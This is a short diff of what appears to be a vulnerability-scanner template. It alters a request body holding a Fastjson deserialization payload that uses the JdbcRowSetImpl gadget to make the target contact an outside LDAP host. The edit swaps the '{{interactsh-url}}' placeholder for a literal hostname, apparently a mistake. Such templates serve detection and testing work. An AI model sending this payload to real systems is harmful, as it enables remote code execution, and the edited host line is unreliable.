@@ -21,7 +21,7 @@ http:
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
-        _json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}
+        _json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://interactsh-url.com","autoCommit":true}}
 
     matchers-condition: and
     matchers:
